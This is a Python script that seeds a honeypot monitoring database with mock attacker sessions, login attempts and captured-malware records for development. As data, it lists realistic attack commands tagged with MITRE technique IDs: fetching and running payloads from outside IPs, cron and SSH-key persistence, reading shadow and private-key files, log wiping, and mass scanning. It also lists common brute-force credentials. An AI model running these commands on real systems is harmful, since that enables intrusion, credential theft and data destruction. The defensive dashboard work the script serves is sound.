"""Generate realistic mock honeypot data for development."""
import random
import uuid
from datetime import datetime, timedelta

from app.database import engine, Base, SessionLocal
from app.models import Attempt, CapturedFile, Session

# Realistic attacker profiles by country
ATTACKERS = [
    {"country_code": "CN", "country_name": "China", "city": "Beijing", "lat": 39.9042, "lng": 116.4074, "weight": 25},
    {"country_code": "CN", "country_name": "China", "city": "Shanghai", "lat": 31.2304, "lng": 121.4737, "weight": 15},
    {"country_code": "CN", "country_name": "China", "city": "Shenzhen", "lat": 22.5431, "lng": 114.0579, "weight": 10},
    {"country_code": "RU", "country_name": "Russia", "city": "Moscow", "lat": 55.7558, "lng": 37.6173, "weight": 18},
    {"country_code": "RU", "country_name": "Russia", "city": "St Petersburg", "lat": 59.9343, "lng": 30.3351, "weight": 8},
    {"country_code": "US", "country_name": "United States", "city": "New York", "lat": 40.7128, "lng": -74.0060, "weight": 12},
    {"country_code": "US", "country_name": "United States", "city": "Los Angeles", "lat": 34.0522, "lng": -118.2437, "weight": 6},
    {"country_code": "US", "country_name": "United States", "city": "Dallas", "lat": 32.7767, "lng": -96.7970, "weight": 5},
    {"country_code": "BR", "country_name": "Brazil", "city": "São Paulo", "lat": -23.5505, "lng": -46.6333, "weight": 10},
    {"country_code": "BR", "country_name": "Brazil", "city": "Rio de Janeiro", "lat": -22.9068, "lng": -43.1729, "weight": 5},
    {"country_code": "IN", "country_name": "India", "city": "Mumbai", "lat": 19.0760, "lng": 72.8777, "weight": 8},
    {"country_code": "IN", "country_name": "India", "city": "Bangalore", "lat": 12.9716, "lng": 77.5946, "weight": 5},
    {"country_code": "KR", "country_name": "South Korea", "city": "Seoul", "lat": 37.5665, "lng": 126.9780, "weight": 7},
    {"country_code": "DE", "country_name": "Germany", "city": "Frankfurt", "lat": 50.1109, "lng": 8.6821, "weight": 6},
    {"country_code": "NL", "country_name": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lng": 4.9041, "weight": 8},
    {"country_code": "VN", "country_name": "Vietnam", "city": "Ho Chi Minh City", "lat": 10.8231, "lng": 106.6297, "weight": 7},
    {"country_code": "IR", "country_name": "Iran", "city": "Tehran", "lat": 35.6892, "lng": 51.3890, "weight": 4},
    {"country_code": "UA", "country_name": "Ukraine", "city": "Kyiv", "lat": 50.4501, "lng": 30.5234, "weight": 5},
    {"country_code": "RO", "country_name": "Romania", "city": "Bucharest", "lat": 44.4268, "lng": 26.1025, "weight": 4},
    {"country_code": "ID", "country_name": "Indonesia", "city": "Jakarta", "lat": -6.2088, "lng": 106.8456, "weight": 5},
    {"country_code": "TH", "country_name": "Thailand", "city": "Bangkok", "lat": 13.7563, "lng": 100.5018, "weight": 3},
    {"country_code": "PH", "country_name": "Philippines", "city": "Manila", "lat": 14.5995, "lng": 120.9842, "weight": 3},
    {"country_code": "AR", "country_name": "Argentina", "city": "Buenos Aires", "lat": -34.6037, "lng": -58.3816, "weight": 3},
    {"country_code": "GB", "country_name": "United Kingdom", "city": "London", "lat": 51.5074, "lng": -0.1278, "weight": 4},
    {"country_code": "FR", "country_name": "France", "city": "Paris", "lat": 48.8566, "lng": 2.3522, "weight": 3},
    {"country_code": "NG", "country_name": "Nigeria", "city": "Lagos", "lat": 6.5244, "lng": 3.3792, "weight": 3},
    {"country_code": "PK", "country_name": "Pakistan", "city": "Karachi", "lat": 24.8607, "lng": 67.0011, "weight": 3},
    {"country_code": "EG", "country_name": "Egypt", "city": "Cairo", "lat": 30.0444, "lng": 31.2357, "weight": 2},
]

# Common brute force credentials
USERNAMES = ["root", "admin", "user", "test", "ubuntu", "pi", "oracle", "postgres",
             "mysql", "guest", "ftpuser", "www", "nagios", "tomcat", "jenkins",
             "deploy", "git", "support", "info", "default"]

PASSWORDS = ["123456", "password", "admin", "root", "1234", "12345678", "qwerty",
             "abc123", "monkey", "master", "dragon", "login", "princess", "toor",
             "pass", "test", "guest", "default", "changeme", "P@ssw0rd",
             "admin123", "root123", "password1", "letmein", "welcome"]

# Realistic commands by intent
COMMANDS_BY_INTENT = {
    "reconnaissance": [
        ("uname -a", "T1082"),
        ("cat /etc/passwd", "T1087"),
        ("whoami", "T1033"),
        ("id", "T1033"),
        ("cat /proc/cpuinfo", "T1082"),
        ("cat /etc/issue", "T1082"),
        ("hostname", "T1082"),
        ("ifconfig", "T1016"),
        ("ip addr", "T1016"),
        ("netstat -an", "T1049"),
        ("ps aux", "T1057"),
        ("df -h", "T1082"),
        ("free -m", "T1082"),
        ("w", "T1033"),
        ("last", "T1087"),
    ],
    "malware_deployment": [
        ("wget http://185.220.100.240/bins/mirai.arm7 -O /tmp/.x", "T1105"),
        ("curl http://45.95.169.130/sh | sh", "T1059.004"),
        ("cd /tmp && wget http://194.87.236.14/x86_64 && chmod +x x86_64 && ./x86_64", "T1059.004"),
        ("tftp -g -r bot 185.172.110.224", "T1105"),
        ("wget http://103.203.57.4/bins/dark.arm7", "T1105"),
        ("/bin/busybox wget http://91.92.247.42/Tsunami.x86", "T1105"),
        ("curl -O http://185.196.8.70/miner.sh && bash miner.sh", "T1059.004"),
    ],
    "persistence": [
        ("crontab -l", "T1053.003"),
        ("echo '*/5 * * * * /tmp/.update' >> /var/spool/cron/root", "T1053.003"),
        ("chmod +x /tmp/.x", "T1222"),
        ("chattr +i /tmp/.x", "T1222"),
        ("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "T1098.004"),
        ("nohup /tmp/.update &", "T1053"),
    ],
    "cryptomining": [
        ("wget -q http://pool.minexmr.com/miner.sh -O- | sh", "T1496"),
        ("./xmrig -o stratum+tcp://pool.hashvault.pro:80 -u 4...", "T1496"),
        ("pkill -9 xmrig; pkill -9 kdevtmpfsi", "T1489"),
        ("echo '*/10 * * * * /tmp/kinsing' | crontab -", "T1496"),
    ],
    "credential_theft": [
        ("cat /etc/shadow", "T1003.008"),
        ("cat ~/.bash_history", "T1552.003"),
        ("find / -name '*.pem' 2>/dev/null", "T1552.004"),
        ("cat /root/.ssh/id_rsa", "T1552.004"),
        ("cat /etc/mysql/my.cnf", "T1552.001"),
    ],
    "sabotage": [
        ("rm -rf /var/log/*", "T1070.002"),
        ("history -c", "T1070.003"),
        ("iptables -F", "T1562.004"),
        ("kill -9 -1", "T1489"),
    ],
    "lateral_movement": [
        ("ssh root@192.168.1.1", "T1021.004"),
        ("scp /tmp/bot root@10.0.0.2:/tmp/", "T1021.004"),
        ("nmap -sP 192.168.0.0/24", "T1018"),
    ],
    "scanning": [
        ("nmap -sV 10.0.0.0/8", "T1046"),
        ("masscan 0.0.0.0/0 -p22 --rate 10000", "T1046"),
        ("zmap -p 23 10.0.0.0/8", "T1046"),
    ],
}

# Mock captured files
CAPTURED_FILES = [
    {"filename": "mirai.arm7", "file_type": "application/x-executable", "size": 98304,
     "family": "Mirai", "vt_pos": 48, "vt_total": 72},
    {"filename": "tsunami.x86", "file_type": "application/x-executable", "size": 65536,
     "family": "Tsunami/Kaiten", "vt_pos": 41, "vt_total": 72},
    {"filename": "xmrig", "file_type": "application/x-executable", "size": 4194304,
     "family": "XMRig Miner", "vt_pos": 35, "vt_total": 72},
    {"filename": "kinsing", "file_type": "application/x-executable", "size": 16384,
     "family": "Kinsing", "vt_pos": 52, "vt_total": 72},
    {"filename": "miner.sh", "file_type": "text/x-shellscript", "size": 2048,
     "family": "CoinMiner", "vt_pos": 22, "vt_total": 72},
    {"filename": "bot.sh", "file_type": "text/x-shellscript", "size": 1536,
     "family": "ShellBot", "vt_pos": 30, "vt_total": 72},
    {"filename": "rootkit.so", "file_type": "application/x-sharedlib", "size": 32768,
     "family": "Jynx2", "vt_pos": 38, "vt_total": 72},
]


def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def pick_attacker():
    weights = [a["weight"] for a in ATTACKERS]
    return random.choices(ATTACKERS, weights=weights, k=1)[0]


def seed(num_sessions=300, days_back=30):
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()

    # Clear existing data
    db.query(CapturedFile).delete()
    db.query(Attempt).delete()
    db.query(Session).delete()
    db.commit()

    now = datetime.utcnow()
    start = now - timedelta(days=days_back)

    for _ in range(num_sessions):
        attacker = pick_attacker()
        ip = random_ip()
        session_id = uuid.uuid4().hex[:12]
        protocol = random.choice(["ssh", "ssh", "ssh", "telnet"])
        session_start = start + timedelta(
            seconds=random.randint(0, int((now - start).total_seconds()))
        )

        # Add jitter to coordinates
        lat = attacker["lat"] + random.uniform(-2, 2)
        lng = attacker["lng"] + random.uniform(-2, 2)

        # Phase 1: Login attempts (brute force)
        num_login_attempts = random.randint(1, 20)
        success_at = random.randint(min(3, num_login_attempts), num_login_attempts) if random.random() < 0.4 else None

        ts = session_start
        for i in range(num_login_attempts):
            ts += timedelta(seconds=random.uniform(0.5, 3))
            success = (i == success_at) if success_at else False
            attempt = Attempt(
                session_id=session_id,
                event_id="cowrie.login.success" if success else "cowrie.login.failed",
                timestamp=ts,
                src_ip=ip,
                src_port=random.randint(1024, 65535),
                dst_port=22 if protocol == "ssh" else 23,
                protocol=protocol,
                country_code=attacker["country_code"],
                country_name=attacker["country_name"],
                city=attacker["city"],
                latitude=lat,
                longitude=lng,
                username=random.choice(USERNAMES),
                password=random.choice(PASSWORDS),
                success=success,
                intent="brute_force",
                mitre_id="T1110",
            )
            db.add(attempt)

        # Phase 2: Post-login commands (if login succeeded)
        if success_at is not None:
            # Pick 1-3 intent categories for this session
            intents = random.sample(
                list(COMMANDS_BY_INTENT.keys()),
                k=random.randint(1, 3),
            )
            # Always start with recon
            if "reconnaissance" not in intents:
                intents.insert(0, "reconnaissance")

            for intent in intents:
                cmds = COMMANDS_BY_INTENT[intent]
                num_cmds = random.randint(1, min(4, len(cmds)))
                selected = random.sample(cmds, num_cmds)

                for cmd_text, mitre_id in selected:
                    ts += timedelta(seconds=random.uniform(1, 10))
                    attempt = Attempt(
                        session_id=session_id,
                        event_id="cowrie.command.input",
                        timestamp=ts,
                        src_ip=ip,
                        src_port=random.randint(1024, 65535),
                        dst_port=22 if protocol == "ssh" else 23,
                        protocol=protocol,
                        country_code=attacker["country_code"],
                        country_name=attacker["country_name"],
                        city=attacker["city"],
                        latitude=lat,
                        longitude=lng,
                        command=cmd_text,
                        intent=intent,
                        mitre_id=mitre_id,
                    )
                    db.add(attempt)

            # Phase 3: File downloads (some sessions)
            if random.random() < 0.3:
                file_info = random.choice(CAPTURED_FILES)
                ts += timedelta(seconds=random.uniform(2, 15))
                sha = uuid.uuid4().hex + uuid.uuid4().hex[:32]

                file_attempt = Attempt(
                    session_id=session_id,
                    event_id="cowrie.session.file_download",
                    timestamp=ts,
                    src_ip=ip,
                    src_port=random.randint(1024, 65535),
                    dst_port=22 if protocol == "ssh" else 23,
                    protocol=protocol,
                    country_code=attacker["country_code"],
                    country_name=attacker["country_name"],
                    city=attacker["city"],
                    latitude=lat,
                    longitude=lng,
                    command=f"wget {file_info['filename']}",
                    intent="malware_deployment",
                    mitre_id="T1105",
                )
                db.add(file_attempt)
                db.flush()

                captured = CapturedFile(
                    attempt_id=file_attempt.id,
                    session_id=session_id,
                    timestamp=ts,
                    filename=file_info["filename"],
                    sha256=sha,
                    file_size=file_info["size"],
                    file_type=file_info["file_type"],
                    vt_positives=file_info["vt_pos"],
                    vt_total=file_info["vt_total"],
                    malware_family=file_info["family"],
                    yara_matches=f'["{file_info["family"]}"]',
                )
                db.add(captured)

        # Create session record
        session_record = Session(
            session_id=session_id,
            src_ip=ip,
            start_time=session_start,
            end_time=ts,
            protocol=protocol,
            login_attempts=num_login_attempts,
            commands_run=0,
            files_downloaded=0,
            duration_secs=(ts - session_start).total_seconds(),
            country_code=attacker["country_code"],
            country_name=attacker["country_name"],
            latitude=lat,
            longitude=lng,
            abuseipdb_score=random.randint(20, 100),
            is_tor=random.random() < 0.1,
            is_vpn=random.random() < 0.15,
            is_known_attacker=random.random() < 0.6,
        )
        db.add(session_record)

    db.commit()

    total = db.query(Attempt).count()
    files = db.query(CapturedFile).count()
    sessions = db.query(Session).count()
    db.close()

    print(f"Seeded: {total} attempts, {sessions} sessions, {files} captured files")


if __name__ == "__main__":
    seed()
